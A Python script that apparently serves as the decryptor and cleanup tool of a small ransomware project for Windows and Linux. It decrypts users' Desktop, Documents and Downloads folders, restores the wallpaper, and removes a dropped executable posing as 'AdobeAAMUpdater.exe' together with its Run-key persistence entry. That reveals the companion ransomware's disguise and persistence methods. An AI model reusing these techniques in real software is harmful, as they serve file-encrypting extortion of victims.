from Func import Decrypt
from os import path,getenv,remove
from os import system as sys
from platform import system
from shutil import copyfile
from winreg import *

s = system()
if s=='Windows':
	try:
		appdata = getenv('APPDATA')
		dest = appdata+"\\Microsoft\\Windows\\Themes"
		copyfile(dest+'\\.transold',dest+'\\TranscodedWallpaper')
		sys("taskkill /f /im explorer.exe")
		sys("start C:/Windows/explorer.exe")
	except:
		pass

	try:
		remove('C:/Users/Public/AdobeAAMUpdater.exe')
	except:
		pass

	try:
		keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
		key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
		DeleteValue(key,'AdobeAAM')
	except PermissionError:
		keypath = r'Software\Microsoft\Windows\CurrentVersion\Run'
		key = OpenKey(HKEY_LOCAL_MACHINE,keypath,KEY_ALL_ACCESS)
		DeleteValue(key,'AdobeAAM')

	Decrypt.getkey()

	try:
		desktop = path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = path.expanduser('~/Downloads')
	except:
		pass

	Decrypt.decryptingcommon(desktop)
	Decrypt.decryptingcommon(downloads)
	Decrypt.decryptingcommon(documents)

	Decrypt.cureall()

elif s=='Linux':
	Decrypt.getkey()

	try:
		desktop = path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = path.expanduser('~/Downloads')
	except:
		pass
	try:
		area = path.expanduser('~/Área de trabalho')
	except:
		pass
	try:
		documentos = path.expanduser('~/Documentos')
	except:
		pass

	Decrypt.decryptingcommon(desktop)
	Decrypt.decryptingcommon(downloads)
	Decrypt.decryptingcommon(documents)
	Decrypt.decryptingcommon(area)
	Decrypt.decryptingcommon(documentos)

	Decrypt.cureall()
